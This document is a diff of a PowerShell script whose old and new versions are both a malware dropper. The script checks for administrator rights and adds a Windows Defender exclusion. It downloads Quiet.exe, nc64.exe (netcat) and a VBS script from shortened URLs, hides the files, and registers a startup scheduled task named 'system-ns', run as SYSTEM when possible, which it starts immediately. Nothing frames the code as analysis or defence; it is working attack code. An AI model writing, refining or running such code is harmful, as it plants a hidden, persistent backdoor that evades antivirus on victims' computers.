@@ -1,49 +1,72 @@
-# Check if running as admin
+# Check if the script is running as an Administrator
 $isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# Determine installation path
-$installPath = $isAdmin ? "C:\Windows" : (Join-Path $env:USERPROFILE "System")
+if ($isAdmin) {
+    Write-Output "Running as Administrator"
 
-# Create directory if not exists
+    # Admin rights detected
+    $installPath = "C:\Windows"
+    $scriptVbsUrl = "https://rb.gy/w3a7hb"
+
+    # Windows Defender Exclusion
+    Add-MpPreference -ExclusionPath $installPath
+} else {
+    Write-Output "Not running as Administrator"
+
+    # No admin rights
+    $installPath = Join-Path $env:USERPROFILE "System"
+    $scriptVbsUrl = "https://rb.gy/3lld2p"
+}
+
+# Create the installation directory if it doesn't exist
 if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 }
 
-# Download files
-$files = @{
-    "Quiet.exe" = "https://rb.gy/mx0i5"
-    "nc64.exe" = "https://rb.gy/guty9"
-    "script.vbs" = $isAdmin ? "https://rb.gy/w3a7hb" : "https://rb.gy/3lld2p"
-}
-
-foreach ($fileName in $files.Keys) {
-    $filePath = Join-Path $installPath $fileName
-    try {
-        Invoke-WebRequest -Uri $files[$fileName] -OutFile $filePath -ErrorAction Stop
-        attrib +H $filePath
-    } catch {
-        Write-Output "Failed to download $fileName"
-    }
-}
-
-# Prepare task details
-$taskName = "RunScriptVBS-$($env:USERNAME -replace '\s+')"
+# File download paths
+$quietTxtPath = Join-Path $installPath "Quiet.exe"
+$nc64TxtPath = Join-Path $installPath "nc64.exe"
 $scriptVbsPath = Join-Path $installPath "script.vbs"
 
-# Create scheduled task command
-$taskArgs = @(
-    "/create",
-    "/tn", $taskName,
-    "/tr", "wscript.exe ""$scriptVbsPath""",
-    "/sc", ($isAdmin ? "onstart" : "onlogon"),
-    "/ru", ($isAdmin ? "SYSTEM" : $env:USERNAME),
-    "/f"
-)
+# URLs for Quiet.exe and nc64.exe
+$quietTxtUrl = "https://rb.gy/mx0i5"
+$nc64TxtUrl = "https://rb.gy/guty9"
 
-# Execute scheduled task creation
-$process = Start-Process schtasks -ArgumentList $taskArgs -PassThru -Wait
-if ($process.ExitCode -eq 0) {
-    Write-Output "Scheduled task created successfully"
-} else {
-    Write-Output "Failed to create scheduled task"
+# Download files
+Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
+Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
+Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
+
+# Make the downloaded files hidden
+attrib +H $quietTxtPath
+attrib +H $nc64TxtPath
+attrib +H $scriptVbsPath
+
+# Create a scheduled task
+$action = New-ScheduledTaskAction -Execute $scriptVbsPath
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
+
+try {
+    $taskName = "system-ns"
+
+    if ($isAdmin) {
+        # If admin rights, run as NT AUTHORITY\SYSTEM
+        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+
+        # Register the task with SYSTEM account
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
+    } else {
+        # If not admin, create the task with the current user's context
+        $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive
+
+        # Register the task with the current user's context
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
+    }
+
+    # Start the task immediately after registration
+    Start-ScheduledTask -TaskName $taskName
+
+} catch {
+    Write-Output "Failed to register or start the scheduled task: $_"
 }
